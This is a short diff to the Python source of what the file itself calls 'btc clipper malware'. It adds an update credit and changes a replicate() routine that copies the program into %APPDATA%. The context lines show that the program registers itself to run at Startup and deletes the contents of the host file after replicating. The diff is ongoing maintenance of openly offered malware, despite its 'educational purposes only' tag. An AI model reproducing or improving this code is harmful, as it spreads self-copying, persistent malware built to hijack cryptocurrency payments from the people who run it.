@@ -8,12 +8,12 @@ import sys
 import logging
 
 # DEVELOPED BY NIGHTFALL#2512 / GITHUB.COM/NIGHTFALLGT / EDUCATIONAL PURPOSES ONLY
+# Updated By github.com/spoooky762 30/03/2026
 
 BTC_ADDRESS = 'you have been infected by btc clipper malware'
 
 #Add code/ message in current.py file after deleting current .py file contents after replicating.
-SELF_DESTRUCT_MESSAGE = 'File contents have been deleted. \n To remove the \
-btc clipper, Delete it from %APPDATA% and delete it from Startup in the Registry Editor' 
+SELF_DESTRUCT_MESSAGE = 'File contents have been deleted. \n To remove the btc clipper\n Delete it from %APPDATA% and delete it from Startup in the Registry Editor' 
 
 logging.basicConfig(format='[%(asctime)s] %(message)s', datefmt='%H:%M:%S', level=logging.DEBUG) #debug mode on 
 
@@ -100,7 +100,7 @@ def replicate():
             virus_code.append(line)
 
     path =  os.getenv('APPDATA') + '\\'
-    hide_path = os.getenv('APPDATA') + '\\' + sys.argv[0] #BACK
+    hide_path = os.path.join(os.getenv('APPDATA'), sys.argv[0]) # Updated Line from the original "hide_path = os.getenv('APPDATA') + '\\' + sys.argv[0]" ~spoooky762
     logging.debug('Hide path: %s '% hide_path)
 
     with open(hide_path, 'w', encoding='utf-8') as f:
